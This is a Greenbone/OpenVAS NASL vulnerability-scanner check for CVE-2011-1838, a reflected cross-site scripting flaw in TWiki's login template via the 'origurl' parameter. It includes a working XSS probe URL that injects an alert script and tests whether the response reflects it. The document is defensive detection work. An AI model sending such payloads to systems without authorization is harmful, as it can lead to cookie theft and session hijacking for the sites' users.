# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = 'cpe:/a:twiki:twiki';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902434");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2011-1838");

  script_name("TWiki 'TemplateLogin.pm' Multiple XSS Vulnerabilities");

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("twiki/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to inject arbitrary web script
  or HTML. This may allow the attacker to steal cookie-based authentication credentials and to launch other
  attacks.");

  script_tag(name:"affected", value:"TWiki version prior to 5.0.2");

  script_tag(name:"insight", value:"Multiple flaws are due to an input validation error in lib/TWiki
  /LoginManager/TemplateLogin.pm, when handling 'origurl' parameter to a view or login script.");

  script_tag(name:"solution", value:"Apply the patch or upgrade to TWiki 5.0.2 or later.");

  script_xref(name:"URL", value:"http://twiki.org/cgi-bin/view/Codev/DownloadTWiki");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47899");

  script_tag(name:"summary", value:"TWiki is prone to multiple cross site scripting vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44594");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1025542");
  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/netsparker-advisories/");
  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/XSS-vulnerability-in-Twiki/");
  script_xref(name:"URL", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2011-1838");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/login/Main/WebHome?"1=;origurl=1""' +
            '--></style></script><script>alert("XSS-TEST")</script>';

req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );

if(res =~ "^HTTP/1\.[01] 200" && '-></style></script><script>alert("XSS-TEST")</script>' >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
